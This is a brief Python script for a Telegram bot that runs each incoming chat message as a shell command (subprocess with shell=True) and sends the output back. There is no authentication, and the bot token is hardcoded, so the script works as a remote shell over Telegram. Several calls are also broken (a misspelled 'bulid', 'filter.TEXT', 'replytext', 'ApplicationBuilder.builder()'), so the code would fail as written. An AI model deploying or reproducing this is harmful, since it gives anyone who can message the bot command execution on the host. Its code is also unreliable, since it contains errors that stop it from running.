import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, filters

BOT_TOKEN = "7703670023:AAEjsUcSLAxTZr_n2VO8A8FhSZoTbOS0xx0"

async def reply(update:Update,context) -> None:
    user_message = update.message.text
    print(user_message)
    result = subprocess.check_output(user_message,shell=True, text=True)
    print(result)
    await update.message.replytext(f"shell output:{result}")

def main() -> None:
    app = ApplicationBuilder.builder().token(BOT_TOKEN).bulid()
    app.add_handler(MessageHandler(filter.TEXT, reply))
    app.run_polling()

if __name__ == "__main__":
    main()


